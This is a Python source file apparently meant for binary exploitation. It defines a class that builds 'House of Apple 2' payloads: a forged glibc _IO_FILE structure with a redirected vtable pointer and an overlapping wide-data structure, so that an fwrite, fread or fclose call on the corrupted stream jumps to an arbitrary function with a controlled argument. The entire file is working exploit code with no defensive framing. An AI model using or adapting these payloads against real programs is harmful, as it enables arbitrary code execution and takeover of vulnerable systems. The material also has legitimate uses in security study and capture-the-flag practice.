import struct


class HouseOfApple2:
    def __init__(self, libc_io_wfile_jumps, ptr_to_null):
        self._ptr_to_null = ptr_to_null
        self._libc_io_wfile_jumps = libc_io_wfile_jumps

    def fwrite_payload(self, base_ptr, arbitrary_func, arg=None):
        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x38, arg=arg)

    def fread_payload(self, base_ptr, arbitrary_func, arg=None):
        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x40, arg=arg)

    def fclose_payload(self, base_ptr, arbitrary_func, arg=None):
        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x10, arg=arg)

    def payload(self, base_ptr, arbitrary_func, dispatch_offset, arg=None):
        io_wfile_overflow = self._libc_io_wfile_jumps + 0x8 * 3
        file_vtable = io_wfile_overflow - dispatch_offset

        file_struct = self._file_struct(file_vtable, base_ptr + 8)
        wide_data_vtable = base_ptr + len(file_struct) - 0x68
        overlapped_struct = self._overlap_wide_data_struct(
            file_struct, wide_data_vtable, arbitrary_func
        )
        return self._place_arg(overlapped_struct, arg)

    def _file_struct(self, vtable, wide_data):
        return (
            struct.pack("<I", 0x0)  # _flags
            + struct.pack("<I", 0x0)  # padding
            + struct.pack("<Q", 0x0)  # _IO_read_ptr
            + struct.pack("<Q", 0x0)  # _IO_read_end
            + struct.pack("<Q", 0x0)  # _IO_read_base
            + struct.pack("<Q", 0x0)  # _IO_write_base
            + struct.pack("<Q", 0x0)  # _IO_write_ptr
            + struct.pack("<Q", 0x0)  # _IO_write_end
            + struct.pack("<Q", 0x0)  # _IO_buf_base
            + struct.pack("<Q", 0x0)  # _IO_buf_end
            + struct.pack("<Q", 0x0)  # _IO_save_base
            + struct.pack("<Q", 0x0)  # _IO_backup_base
            + struct.pack("<Q", 0x0)  # _IO_save_end
            + struct.pack("<Q", 0x0)  # _markers
            + struct.pack("<Q", 0x0)  # _chain
            + struct.pack("<I", 0x0)  # _fileno
            + struct.pack("<I", 0x0)  # _flags2
            + struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)  # _old_offset
            + struct.pack("<H", 0x0)  # _cur_column
            + struct.pack("<b", 0x0)  # _vtable_offset
            + struct.pack("<B", 0x0)  # _shortbuf[0]
            + struct.pack("<I", 0x0)  # padding
            + struct.pack("<Q", self._ptr_to_null)  # _lock
            + struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)  # _offset
            + struct.pack("<Q", 0x0)  # _codecvt
            + struct.pack("<Q", wide_data)  # _wide_data
            + struct.pack("<Q", 0x0)  # _freeres_list
            + struct.pack("<Q", 0x0)  # _freeres_buf
            + struct.pack("<Q", 0x0)  # __pad5
            + struct.pack("<I", 0x0)  # _mode
            + b"\x00" * 20  # _unused2
            + struct.pack("<Q", vtable)  # vtable
        )

    def _overlap_wide_data_struct(self, file_struct, wide_data_vtable, arbitrary_func):
        return (
            file_struct
            + struct.pack("<Q", arbitrary_func)
            + struct.pack("<Q", wide_data_vtable)
        )

    def _place_arg(self, overlapped_struct, arg):
        if arg is None:
            return overlapped_struct

        if len(arg) > 0x88:
            raise ValueError("arg too long, would clobber the _lock")

        return arg + overlapped_struct[len(arg) :]
